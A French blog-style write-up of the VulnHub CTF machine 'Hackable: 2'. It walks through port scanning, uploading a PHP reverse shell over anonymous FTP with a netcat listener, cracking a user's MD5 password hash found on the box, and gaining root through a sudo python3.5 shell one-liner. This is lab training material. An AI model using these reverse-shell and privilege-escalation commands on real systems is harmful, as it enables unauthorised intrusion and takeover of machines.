---
title: "CTF Hackable: 2"
date: 2021-06-23
tags: ["Pentest", "CTF", "webshell"]
download: https://www.vulnhub.com/entry/hackable-ii,711
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.2** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.32`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir Hackable2 && cd Hackable2`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 (RSA)
|   256 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 (ECDSA)
|_  256 f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On a un serveur **FTP** sur le port **21**, un serveur **SSH** sur le port **22** et un serveur **Apache** 2.4.18 sur le port **80**.

```bash
$ ftp $IP
Connected to 192.168.1.32.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.32]
Name (192.168.1.32:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xrwx   2 33       33           4096 Nov 26  2020 .
drwxr-xrwx   2 33       33           4096 Nov 26  2020 ..
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> get CALL.html
local: CALL.html remote: CALL.html
200 PORT command successful
150 Opening BINARY mode data connection for CALL.html (109 bytes)
226 Transfer complete
```

On récupère le fichier HTML.

```html
$ cat CALL.html                                      
<html>
<head>
    <title>onion</title>
</head>
<body>
    <h1>GET READY TO RECEIVE A CALL</h1>
</body>
</html>
```

Rien d'intéressant dans le fichier HTML si ce n'est le message "GET READY TO RECEIVE A CALL"... On teste la sécurité du serveur **Apache** avec **Nikto** dans un second onglet du terminal.

```bash
$ nikto -h http://$IP -o nikto.txt
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2be7, size: 5b504999e72a0, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
```

Dans le répértoire "files", on retrouve le fichier HTML présent dans le serveur **FTP**.

On prépare le webshell pour l'uploader sur le serveur **FTP**.

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php .
$ vim php-reverse-shell.php
/$ip
```

Dans un troisième onglet, lancez le serveur **Netcat** avec la commande `nc -lnvp 1234`.

On retourne sur le serveur FTP pour y glisser notre webshell.

```bash
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful
150 Opening BINARY mode data connection for php-reverse-shell.php
226 Transfer complete
5494 bytes sent in 0.00 secs (68.0453 MB/s)
```

## Pénétration

Dans le second onglet, la connexion au serveur **Netcat** est établie.

```bash
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Dans le fichier ".runme.sh" présent à la racine du serveur, on trouve un nouvel utilisateur "shrek" et un mot de passe associé sous la forme d'une chaine de caractères en **MD5**.

```bash
$ tail /.runme.sh
shrek:cf4c2232354952690368f1b3dfdfb24d
```

Après l'avoir décryptée sur le Web, on trouve le couple login et mot de passe "shrek:onion"

```bash
$ su shrek
Password: onion
```

On est connecté avec ce nouvel utilisateur et on trouve le flag user dans le dossier de cet utilisateur `cat /home/shrek/user.txt`.

## Escalation

```bash
$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```

Cet utilisateur a des privilèges `sudo` avec la commande `python3.5`.

Sur [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo), on trouve facilement la commande pour être root de la machine avec `sudo`.

```bash
$ sudo python3.5 -c 'import os; os.system("/bin/sh")'
$ id
uid=0(root) gid=0(root) groups=0(root)
```

On trouve le flag root dans le dossier `cat /root/root.txt`.
